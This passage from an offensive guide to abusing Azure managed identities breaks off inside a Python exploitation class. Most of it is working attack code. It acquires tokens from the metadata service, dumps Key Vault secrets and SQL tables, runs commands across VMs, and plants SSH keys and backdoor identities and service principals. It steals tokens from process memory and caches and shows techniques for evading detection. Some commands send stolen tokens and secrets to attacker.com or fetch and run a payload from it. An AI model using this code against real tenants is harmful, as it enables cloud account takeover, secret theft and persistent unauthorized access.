# Metadata: true
```

#### Managed Identity Environment Variables

```bash
# Azure VMs and some services
IDENTITY_ENDPOINT=http://169.254.169.254/metadata/identity/oauth2/token
IDENTITY_HEADER=<dynamic-value>

# App Service / Azure Functions
MSI_ENDPOINT=http://127.0.0.1:<port>/MSI/token/
MSI_SECRET=<secret-value>

# Azure Arc-enabled servers
IDENTITY_ENDPOINT=http://localhost:40342/metadata/identity/oauth2/token
IMDS_ENDPOINT=http://localhost:40342
```

### Enumeration

#### Detecting Managed Identity Presence

**From Compromised VM**

```bash
# Test IMDS endpoint
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Check for successful response (HTTP 200)
# Response contains: access_token, expires_in, resource, token_type

# Get instance metadata (non-identity info)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq .

# Extract useful info
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
  jq -r '.compute | {name, resourceGroupName, subscriptionId, vmId}'
```

**From App Service / Azure Function**

```bash
# Check environment variables
env | grep -i identity
env | grep -i msi

# Test MSI endpoint
curl -H "X-IDENTITY-HEADER: $MSI_SECRET" \
  "$MSI_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/"
```

**From Azure Container Instances**

```bash
# ACI uses IMDS endpoint similar to VMs
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**From Azure Kubernetes Service (AKS)**

```bash
# Check for aad-pod-identity
kubectl get azureidentity --all-namespaces
kubectl get azureidentitybinding --all-namespaces

# Check pod for identity
kubectl describe pod <pod-name> | grep -i identity

# From within pod
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

#### Identifying Assigned Permissions

**Using Azure CLI**

```bash
# Get access token
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
  jq -r .access_token)

# Decode JWT to see claims
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Get object ID from token
OID=$(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq -r .oid)

# Login with managed identity
az login --identity

# Get current identity details
az account show

# List role assignments
az role assignment list --assignee $OID --output table
az role assignment list --all --output table | grep $OID
```

**Using REST API**

```bash
# Get subscription ID from metadata
SUB_ID=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
  jq -r .compute.subscriptionId)

# List role assignments
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | \
  jq '.value[] | select(.properties.principalId == "'$OID'")'

# Get role definition details
ROLE_DEF_ID="<role-definition-id-from-above>"
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com$ROLE_DEF_ID?api-version=2022-04-01" | \
  jq .properties.permissions
```

### Token Acquisition

#### Obtaining Tokens for Different Resources

**Azure Resource Manager**

```bash
# Management plane access
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
  jq -r .access_token > arm-token.txt

ARM_TOKEN=$(cat arm-token.txt)
```

**Azure Key Vault**

```bash
# Key Vault data plane
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | \
  jq -r .access_token > vault-token.txt

VAULT_TOKEN=$(cat vault-token.txt)
```

**Azure Storage**

```bash
# Storage data plane
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | \
  jq -r .access_token > storage-token.txt

STORAGE_TOKEN=$(cat storage-token.txt)
```

**Microsoft Graph API**

```bash
# Azure AD / Graph access
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | \
  jq -r .access_token > graph-token.txt

GRAPH_TOKEN=$(cat graph-token.txt)
```

**Azure SQL Database**

```bash
# SQL Database access
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/" | \
  jq -r .access_token > sql-token.txt

SQL_TOKEN=$(cat sql-token.txt)
```

**Azure Service Bus / Event Hubs**

```bash
# Messaging services
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://servicebus.azure.net/" | \
  jq -r .access_token > servicebus-token.txt
```

#### Token Properties

```bash
# Examine token claims
decode_jwt() {
  jq -R 'split(".") | .[1] | @base64d | fromjson' <<< "$1"
}

# Decode ARM token
decode_jwt "$ARM_TOKEN"

# Key claims:
# - oid: Object ID of the managed identity
# - tid: Tenant ID
# - aud: Audience (resource)
# - exp: Expiration timestamp
# - iat: Issued at timestamp
# - appid: Application ID
# - roles: Assigned application roles
```

### Exploitation Techniques

#### Azure Key Vault Access

**Listing Vaults**

```bash
# Find accessible vaults
az keyvault list --output table

# Or via REST API
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" | \
  jq -r '.value[] | .name'
```

**Reading Secrets**

```bash
# List secrets in vault
VAULT_NAME="<vault-name>"
curl -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.4" | \
  jq -r '.value[] | .id'

# Get specific secret
SECRET_NAME="<secret-name>"
curl -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://$VAULT_NAME.vault.azure.net/secrets/$SECRET_NAME?api-version=7.4" | \
  jq -r .value

# Download all secrets
for secret in $(curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.4" | \
  jq -r '.value[] | .id | split("/") | .[-1]'); do
  
  echo "[+] Extracting: $secret"
  curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
    "https://$VAULT_NAME.vault.azure.net/secrets/$secret?api-version=7.4" | \
    jq -r ".value" > "$secret.txt"
done
```

**Reading Keys**

```bash
# List keys
curl -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://$VAULT_NAME.vault.azure.net/keys?api-version=7.4" | \
  jq -r '.value[] | .kid'

# Get key (returns public key only for RSA keys)
KEY_NAME="<key-name>"
curl -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://$VAULT_NAME.vault.azure.net/keys/$KEY_NAME?api-version=7.4"

# [Inference] Private keys cannot be exported directly
# But can be used for crypto operations via API

# Sign data with key
DATA_TO_SIGN=$(echo -n "test data" | base64)
curl -X POST -H "Authorization: Bearer $VAULT_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"alg\": \"RS256\", \"value\": \"$DATA_TO_SIGN\"}" \
  "https://$VAULT_NAME.vault.azure.net/keys/$KEY_NAME/sign?api-version=7.4"
```

**Reading Certificates**

```bash
# List certificates
curl -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://$VAULT_NAME.vault.azure.net/certificates?api-version=7.4" | \
  jq -r '.value[] | .id'

# Get certificate
CERT_NAME="<cert-name>"
curl -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://$VAULT_NAME.vault.azure.net/certificates/$CERT_NAME?api-version=7.4" | \
  jq -r .cer | base64 -d > cert.cer
```

#### Azure Storage Account Access

**Using Storage Token**

```bash
# List storage accounts
az storage account list --output table

# Get storage account key via ARM token (if permissions allow)
STORAGE_ACCOUNT="<account-name>"
RG_NAME="<resource-group>"

az storage account keys list \
  --account-name $STORAGE_ACCOUNT \
  --resource-group $RG_NAME \
  --output table

# Use managed identity directly with Azure CLI
az login --identity
az storage blob list \
  --account-name $STORAGE_ACCOUNT \
  --container-name <container> \
  --auth-mode login
```

**Direct REST API with OAuth Token**

```bash
# List containers
curl -H "Authorization: Bearer $STORAGE_TOKEN" \
  -H "x-ms-version: 2021-08-06" \
  "https://$STORAGE_ACCOUNT.blob.core.windows.net/?comp=list"

# List blobs in container
CONTAINER="<container-name>"
curl -H "Authorization: Bearer $STORAGE_TOKEN" \
  -H "x-ms-version: 2021-08-06" \
  "https://$STORAGE_ACCOUNT.blob.core.windows.net/$CONTAINER?restype=container&comp=list"

# Download blob
BLOB="<blob-name>"
curl -H "Authorization: Bearer $STORAGE_TOKEN" \
  -H "x-ms-version: 2021-08-06" \
  "https://$STORAGE_ACCOUNT.blob.core.windows.net/$CONTAINER/$BLOB" \
  -o downloaded-blob
```

#### Azure SQL Database Access

**Connecting with Managed Identity**

```bash
# Get SQL token
SQL_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/" | \
  jq -r .access_token)

# Connect using sqlcmd (if available)
sqlcmd -S <server>.database.windows.net -d <database> -G -P "$SQL_TOKEN"

# Or using Python
python3 << 'PYTHON'
import pyodbc
import struct

server = '<server>.database.windows.net'
database = '<database>'
token = open('sql-token.txt').read().strip()

# Token format for SQL auth
token_bytes = token.encode('utf-16-le')
token_struct = struct.pack('=I', len(token_bytes)) + token_bytes

conn_str = f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={server};DATABASE={database}'
conn = pyodbc.connect(conn_str, attrs_before={1256: token_struct})

cursor = conn.cursor()
cursor.execute("SELECT @@VERSION")
print(cursor.fetchone())
PYTHON
```

**Querying Database**

```python
#!/usr/bin/env python3
import pyodbc
import struct
import sys

def get_sql_token():
    import subprocess
    result = subprocess.run([
        'curl', '-s', '-H', 'Metadata: true',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/'
    ], capture_output=True, text=True)
    
    import json
    return json.loads(result.stdout)['access_token']

def connect_sql(server, database, token):
    token_bytes = token.encode('utf-16-le')
    token_struct = struct.pack('=I', len(token_bytes)) + token_bytes
    
    conn_str = f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={server};DATABASE={database}'
    return pyodbc.connect(conn_str, attrs_before={1256: token_struct})

def enumerate_tables(conn):
    cursor = conn.cursor()
    cursor.execute("""
        SELECT TABLE_SCHEMA, TABLE_NAME 
        FROM INFORMATION_SCHEMA.TABLES 
        WHERE TABLE_TYPE = 'BASE TABLE'
    """)
    
    for row in cursor.fetchall():
        print(f"[+] {row.TABLE_SCHEMA}.{row.TABLE_NAME}")

def dump_table(conn, schema, table):
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM [{schema}].[{table}]")
    
    columns = [column[0] for column in cursor.description]
    print(f"\n[*] Dumping {schema}.{table}")
    print(" | ".join(columns))
    print("-" * 80)
    
    for row in cursor.fetchall():
        print(" | ".join(str(col) for col in row))

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <server> <database>")
        sys.exit(1)
    
    server = sys.argv[1]
    database = sys.argv[2]
    
    token = get_sql_token()
    conn = connect_sql(server, database, token)
    
    enumerate_tables(conn)
```

#### Azure Resource Manager Operations

**Resource Enumeration**

```bash
# List all resources in subscription
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/resources?api-version=2021-04-01" | \
  jq -r '.value[] | "\(.type) - \(.name)"'

# List resource groups
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/resourcegroups?api-version=2021-04-01" |  
jq -r '.value[] | .name'

# List VMs
curl -H "Authorization: Bearer $ARM_TOKEN"  
"https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01" |  
jq -r '.value[] | "(.name) - (.location)"'

# List storage accounts

curl -H "Authorization: Bearer $ARM_TOKEN"  
"https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" |  
jq -r '.value[] | .name'

# List function apps

curl -H "Authorization: Bearer $ARM_TOKEN"  
"https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.Web/sites?api-version=2022-09-01" |  
jq -r '.value[] | select(.kind | contains("functionapp")) | .name'

````

**Reading Resource Configurations**
```bash
# Get VM details
VM_NAME="<vm-name>"
RG_NAME="<resource-group>"

curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/$RG_NAME/providers/Microsoft.Compute/virtualMachines/$VM_NAME?api-version=2023-03-01" | \
  jq .

# Get network security group rules
NSG_NAME="<nsg-name>"
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/$RG_NAME/providers/Microsoft.Network/networkSecurityGroups/$NSG_NAME?api-version=2023-05-01" | \
  jq '.properties.securityRules'

# Get App Service configuration
APP_NAME="<app-service-name>"
curl -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/$RG_NAME/providers/Microsoft.Web/sites/$APP_NAME/config/appsettings/list?api-version=2022-09-01" \
  -X POST | \
  jq .properties
````

**Modifying Resources (if permissions allow)**

```bash
# Update NSG rule (requires Network Contributor or higher)
curl -X PUT -H "Authorization: Bearer $ARM_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "properties": {
      "protocol": "*",
      "sourcePortRange": "*",
      "destinationPortRange": "22",
      "sourceAddressPrefix": "*",
      "destinationAddressPrefix": "*",
      "access": "Allow",
      "priority": 100,
      "direction": "Inbound"
    }
  }' \
  "https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/$RG_NAME/providers/Microsoft.Network/networkSecurityGroups/$NSG_NAME/securityRules/AllowSSH?api-version=2023-05-01"

# Run command on VM (requires VM Contributor)
curl -X POST -H "Authorization: Bearer $ARM_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "commandId": "RunShellScript",
    "script": ["whoami", "id", "cat /etc/passwd"]
  }' \
  "https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/$RG_NAME/providers/Microsoft.Compute/virtualMachines/$VM_NAME/runCommand?api-version=2023-03-01"

# [Unverified] The above command execution requires sufficient permissions and may be logged
```

#### Microsoft Graph API Access

**Enumerating Azure AD**

```bash
# Get current identity info
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me" | jq .

# List all users (requires appropriate permissions)
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/users" | \
  jq -r '.value[] | "\(.userPrincipalName) - \(.displayName)"'

# List groups
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/groups" | \
  jq -r '.value[] | "\(.displayName) - \(.id)"'

# Get group members
GROUP_ID="<group-id>"
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/groups/$GROUP_ID/members" | \
  jq -r '.value[] | .userPrincipalName'

# List applications
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications" | \
  jq -r '.value[] | "\(.displayName) - \(.appId)"'

# List service principals
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals" | \
  jq -r '.value[] | "\(.displayName) - \(.appId)"'
```

**Reading Mail and Files (if permissions allow)**

```bash
# Read emails (requires Mail.Read permission)
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages" | \
  jq -r '.value[] | "\(.subject) - \(.from.emailAddress.address)"'

# Read OneDrive files (requires Files.Read permission)
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root/children" | \
  jq -r '.value[] | .name'

# Download file
FILE_ID="<file-id>"
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/items/$FILE_ID/content" \
  -o downloaded-file
```

### Privilege Escalation via Managed Identity

#### Identifying Privilege Escalation Paths

**High-Value Role Assignments**

```bash
# Check for privileged roles
az role assignment list --all --output json | \
  jq -r '.[] | select(.roleDefinitionName | contains("Owner") or contains("Contributor") or contains("Administrator")) | 
  "\(.roleDefinitionName) on \(.scope)"'

# Common escalation roles:
# - Contributor: Can create/modify most resources
# - Owner: Full control including role assignments
# - User Access Administrator: Can assign roles
# - Key Vault Administrator: Full Key Vault access
# - Virtual Machine Contributor: Can run commands on VMs
```

**Key Vault as Privilege Escalation Vector**

```bash
# If managed identity has Key Vault access, search for:
# 1. Service principal credentials
# 2. Storage account keys
# 3. Database passwords
# 4. API keys for other services
# 5. Certificates for authentication

# Automated secret scanning
for vault in $(az keyvault list --query "[].name" -o tsv); do
  echo "[*] Scanning vault: $vault"
  
  for secret in $(az keyvault secret list --vault-name $vault --query "[].name" -o tsv 2>/dev/null); do
    echo "[+] Found secret: $secret"
    value=$(az keyvault secret show --vault-name $vault --name $secret --query "value" -o tsv 2>/dev/null)
    
    # Check for connection strings
    if echo "$value" | grep -qi "connectionstring\|accountkey\|password"; then
      echo "[!] High-value secret detected!"
      echo "$value" > "$vault-$secret.txt"
    fi
  done
done
```

#### Lateral Movement Techniques

**VM Command Execution**

```bash
# If managed identity has VM Contributor role
VM_LIST=$(az vm list --query "[].{name:name, rg:resourceGroup}" -o json)

# Execute command on all accessible VMs
echo "$VM_LIST" | jq -c '.[]' | while read vm; do
  VM_NAME=$(echo $vm | jq -r .name)
  RG=$(echo $vm | jq -r .rg)
  
  echo "[*] Executing on $VM_NAME"
  az vm run-command invoke \
    --name $VM_NAME \
    --resource-group $RG \
    --command-id RunShellScript \
    --scripts "whoami && hostname && ip a"
done

# Deploy SSH key for persistent access
SSH_PUB_KEY="<your-public-key>"
az vm run-command invoke \
  --name $VM_NAME \
  --resource-group $RG \
  --command-id RunShellScript \
  --scripts "echo '$SSH_PUB_KEY' >> ~/.ssh/authorized_keys"
```

**Container Instance Deployment**

```bash
# Deploy malicious container with host access
# [Inference] Requires Container Instance Contributor permissions

cat > malicious-container.json << 'EOF'
{
  "location": "eastus",
  "properties": {
    "containers": [
      {
        "name": "debug-container",
        "properties": {
          "image": "ubuntu:latest",
          "command": ["/bin/bash", "-c", "curl http://attacker.com/payload.sh | bash"],
          "resources": {
            "requests": {
              "cpu": 1,
              "memoryInGB": 1.5
            }
          }
        }
      }
    ],
    "osType": "Linux"
  }
}
EOF

az container create \
  --resource-group $RG_NAME \
  --name malicious-container \
  --file malicious-container.json
```

**Automation Account Runbooks**

```bash
# If managed identity can create/modify Automation Account runbooks
AUTOMATION_ACCOUNT="<account-name>"

# Create malicious runbook
cat > runbook.ps1 << 'POWERSHELL'
# Exfiltrate credentials
$secrets = Get-AzKeyVaultSecret -VaultName "target-vault"
$secrets | ConvertTo-Json | Invoke-RestMethod -Method Post -Uri "http://attacker.com/exfil"
POWERSHELL

# Upload runbook
az automation runbook create \
  --resource-group $RG_NAME \
  --automation-account-name $AUTOMATION_ACCOUNT \
  --name ExfilRunbook \
  --type PowerShell \
  --location eastus

az automation runbook replace-content \
  --resource-group $RG_NAME \
  --automation-account-name $AUTOMATION_ACCOUNT \
  --name ExfilRunbook \
  --content @runbook.ps1

# Publish and execute
az automation runbook publish \
  --resource-group $RG_NAME \
  --automation-account-name $AUTOMATION_ACCOUNT \
  --name ExfilRunbook

az automation runbook start \
  --resource-group $RG_NAME \
  --automation-account-name $AUTOMATION_ACCOUNT \
  --name ExfilRunbook
```

### Token Theft and Reuse

#### Stealing Tokens from Running Processes

**Linux Process Memory**

```bash
# Search for tokens in process memory
for pid in $(pgrep -f "python|node|dotnet|java"); do
  echo "[*] Searching PID $pid"
  sudo grep -a "eyJ" /proc/$pid/environ /proc/$pid/cmdline /proc/$pid/maps 2>/dev/null | \
    grep -oP 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' | \
    sort -u
done

# Dump process memory
sudo gcore <pid>
strings core.<pid> | grep -oP 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' > tokens.txt
```

**Windows Process Memory**

```powershell
# PowerShell token extraction
Get-Process | ForEach-Object {
    $processId = $_.Id
    $process = $_.Name
    
    try {
        $handle = [System.Diagnostics.Process]::GetProcessById($processId)
        $modules = $handle.Modules
        
        # [Speculation] Tokens may be in process memory
        Write-Host "[*] Checking $process (PID: $processId)"
    } catch {}
}

# Using Sysinternals procdump
procdump.exe -ma <pid> dump.dmp

# Search dump for tokens
Select-String -Path dump.dmp -Pattern "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" -AllMatches
```

#### Token Caching Locations

**Azure CLI Token Cache**

```bash
# Linux/Mac
cat ~/.azure/accessTokens.json | jq .

# Windows
type %USERPROFILE%\.azure\accessTokens.json

# Extract tokens
jq -r '.[].accessToken' ~/.azure/accessTokens.json > cached-tokens.txt

# Extract specific resource tokens
jq -r '.[] | select(.resource == "https://management.azure.com/") | .accessToken' ~/.azure/accessTokens.json
```

**Azure PowerShell Token Cache**

```powershell
# Windows
$tokenCache = "$env:USERPROFILE\.Azure\TokenCache.dat"
if (Test-Path $tokenCache) {
    # [Unverified] TokenCache.dat is encrypted, but may be decryptable with user context
    Write-Host "[*] Token cache found: $tokenCache"
}

# Get current context tokens
(Get-AzContext).TokenCache | Format-List
```

**Environment Variables**

```bash
# Search environment for tokens
env | grep -i token
env | grep "eyJ"

# Common variables
echo $AZURE_ACCESS_TOKEN
echo $ARM_ACCESS_TOKEN
echo $AZURE_STORAGE_TOKEN
```

#### Token Replay Attacks

```bash
# Use stolen token with curl
STOLEN_TOKEN="<token-from-victim>"

curl -H "Authorization: Bearer $STOLEN_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Use with Azure CLI
az account get-access-token --resource https://management.azure.com/ \
  | jq -r .accessToken > original-token.txt

# Replace with stolen token (manual approach)
# Azure CLI doesn't easily support external token injection
# Use REST API directly instead

# Validate token is still active
decode_jwt "$STOLEN_TOKEN" | jq -r '.exp | todate'
```

### Post-Exploitation Persistence

#### Creating New Managed Identities

```bash
# If attacker has sufficient permissions, create user-assigned identity
az identity create \
  --name backdoor-identity \
  --resource-group $RG_NAME

# Assign roles to new identity
IDENTITY_ID=$(az identity show --name backdoor-identity --resource-group $RG_NAME --query principalId -o tsv)

az role assignment create \
  --assignee $IDENTITY_ID \
  --role "Key Vault Reader" \
  --scope "/subscriptions/$SUB_ID"

# Assign identity to controlled resource
az vm identity assign \
  --name $VM_NAME \
  --resource-group $RG_NAME \
  --identities /subscriptions/$SUB_ID/resourcegroups/$RG_NAME/providers/Microsoft.ManagedIdentity/userAssignedIdentities/backdoor-identity
```

#### Long-lived Access Token Generation

```bash
# Tokens typically expire in 1 hour
# For persistence, automate token refresh

cat > token-refresher.sh << 'BASH'
#!/bin/bash
while true; do
  TOKEN=$(curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
    jq -r .access_token)
  
  echo "[$(date)] Token refreshed"
  echo "$TOKEN" > /tmp/current-token.txt
  
  # Send to C2
  curl -X POST -d "token=$TOKEN" http://attacker.com/token-collector
  
  sleep 3000  # Refresh every 50 minutes
done
BASH

chmod +x token-refresher.sh
nohup ./token-refresher.sh &
```

#### Service Principal Creation

```bash
# If managed identity has permissions to create service principals
# Create backdoor service principal

# [Inference] Requires Application Administrator or Global Administrator role
az ad sp create-for-rbac \
  --name "BackdoorApp" \
  --role Contributor \
  --scopes /subscriptions/$SUB_ID \
  --query "{appId: appId, password: password, tenant: tenant}" \
  --output json > backdoor-sp.json

# Credentials in backdoor-sp.json can be used for long-term access
CLIENT_ID=$(jq -r .appId backdoor-sp.json)
CLIENT_SECRET=$(jq -r .password backdoor-sp.json)
TENANT_ID=$(jq -r .tenant backdoor-sp.json)

# Login with service principal
az login --service-principal \
  --username $CLIENT_ID \
  --password $CLIENT_SECRET \
  --tenant $TENANT_ID
```

### Defense Evasion

#### Avoiding Detection

**Throttling Requests**

```bash
# Space out API calls to avoid rate-limit triggers
sleep_random() {
  sleep $(( RANDOM % 30 + 10 ))  # 10-40 second delays
}

# Enumerate with delays
for vault in $(az keyvault list --query "[].name" -o tsv); do
  echo "[*] Checking $vault"
  az keyvault secret list --vault-name $vault --output table 2>/dev/null
  sleep_random
done
```

**Using Legitimate User Agents**

```bash
# Mimic Azure CLI requests
curl -H "Authorization: Bearer $ARM_TOKEN" \
  -H "User-Agent: python-requests/2.28.0 (AZURECLI/2.50.0)" \
  -H "x-ms-client-request-id: $(uuidgen)" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

**Cleaning Up Activity Logs**

```bash
# [Unverified] Deleting activity logs typically requires high privileges and is logged
# Attempting deletion will likely trigger alerts

# View activity logs (to understand what's logged)
az monitor activity-log list \
  --max-events 50 \
  --output table

# [Inference] Better evasion: Use legitimate-looking operations
# Instead of downloading all blobs, target specific high-value files
# Instead of listing all secrets, access specific known secret names
```

### Automated Exploitation Frameworks

#### ROADtools (Azure AD Enumeration)

```bash
# Install ROADtools
pip3 install roadrecon

# Gather data using managed identity token
roadrecon auth --access-token $GRAPH_TOKEN

roadrecon gather

# Generate report
roadrecon gui

# Export data
roadrecon dump --output-dir ./roadtools-data
```

#### Stormspotter (Azure Enumeration)

```bash
# Install Stormspotter
git clone https://github.com/Azure/Stormspotter
cd Stormspotter

# Run with managed identity
az login --identity
python3 stormspotter/stormcollector.py

# View in Neo4j
docker-compose up
# Navigate to http://localhost:7687
```

#### Custom Exploitation Script

```python
#!/usr/bin/env python3
"""
Azure Managed Identity Exploitation Tool
Automates token acquisition and resource enumeration
"""

import requests
import json
import sys
from base64 import b64decode
from datetime import datetime

class ManagedIdentityExploit:
    def __init__(self):
        self.imds_url = "http://169.254.169.254/metadata/identity/oauth2/token"
        self.tokens = {}
        
    def get_token(self, resource):
        """Acquire token for specified resource"""
        try:
            headers = {"Metadata": "true"}
            params = {
                "api-version": "2018-02-01",
                "resource": resource
            }
            
            response = requests.get(self.imds_url, headers=headers, params=params, timeout=5)
            if response.status_code == 200:
                data = response.json()
                self.tokens[resource] = data['access_token']
                print(f"[+] Token acquired for: {resource}")
                return data['access_token']
            else:
                print(f"[-] Failed to get token for {resource}: {response.status_code}")
                return None
        except Exception as e:
            print(f"[-] Error getting token: {e}")
            return None
    
    def decode_token(self, token):
        """Decode JWT token"""
        try:
            parts = token.split('.')
            payload = parts[1]
            # Add padding if needed
            payload += '=' * (4 - len(payload) % 4)
            decoded = b64decode(payload)
            return json.loads(decoded)
        except Exception as e:
            print(f"[-] Error decoding token: {e}")
            return None
    
    def enumerate_resources(self, arm_token):
        """Enumerate Azure resources"""
        headers = {"Authorization": f"Bearer {arm_token}"}
        
        # Get subscriptions
        url = "https://management.azure.com/subscriptions?api-version=2020-01-01"
        response = requests.get(url, headers=headers)
        
        if response.status_code != 200:
            print(f"[-] Failed to enumerate subscriptions: {response.status_code}")
            return
        
        subscriptions = response.json().get('value', [])
        print(f"\n[*] Found {len(subscriptions)} subscription(s)")
        
        for sub in subscriptions:
            sub_id = sub['subscriptionId']
            print(f"\n[+] Subscription: {sub['displayName']} ({sub_id})")
            
            # List resources
            url = f"https://management.azure.com/subscriptions/{sub_id}/resources?api-version=2021-04-01"
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                resources = response.json().get('value', [])
                print(f"    Resources: {len(resources)}")
                
                # Group by type
                resource_types = {}
                for res in resources:
                    res_type = res['type']
                    resource_types[res_type] = resource_types.get(res_type, 0) + 1
                
                for res_type, count in sorted(resource_types.items()):
                    print(f"      - {res_type}: {count}")
    
    def enumerate_keyvaults(self, arm_token, vault_token):
        """Enumerate and extract Key Vault secrets"""
        headers = {"Authorization": f"Bearer {arm_token}"}
        
        # Get subscriptions
        url = "https://management.azure.com/subscriptions?api-version=2020-01-01"
        response = requests.get(url, headers=headers)
        subscriptions = response.json().get('value', [])
        
        print("\n[*] Enumerating Key Vaults...")
        
        for sub in subscriptions:
            sub_id = sub['subscriptionId']
            
            # List Key Vaults
            url = f"https://management.azure.com/subscriptions/{sub_id}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01"
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                vaults = response.json().get('value', [])
                
                for vault in vaults:
                    vault_name = vault['name']
                    print(f"\n[+] Vault: {vault_name}")
                    
                    # List secrets
                    vault_headers = {"Authorization": f"Bearer {vault_token}"}
                    secrets_url = f"https://{vault_name}.vault.azure.net/secrets?api-version=7.4"
                    
                    try:
                        secrets_response = requests.get(secrets_url, headers=vault_headers, timeout=10)
                        if secrets_response.status_code == 200:
                            secrets = secrets_response.json().get('value', [])
                            print(f"    Found {len(secrets)} secret(s)")
                            
                            for secret in secrets:
                                secret_name = secret['id'].split('/')[-1]
                                
                                # Get secret value
                                secret_url = f"https://{vault_name}.vault.azure.net/secrets/{secret_name}?api-version=7.4"
                                secret_response = requests.get(secret_url, headers=vault_headers, timeout=10)
                                
                                if secret_response.status_code == 200:
                                    secret_value = secret_response.json().get('value')
                                    print(f"      [{secret_name}] = {secret_value[:50]}..." if len(secret_value) > 50 else f"      [{secret_name}] = {secret_value}")
                    except Exception as e:
                        print(f"    [-] Error accessing vault: {e}")
    
    def run(self):
        """Main exploitation routine"""
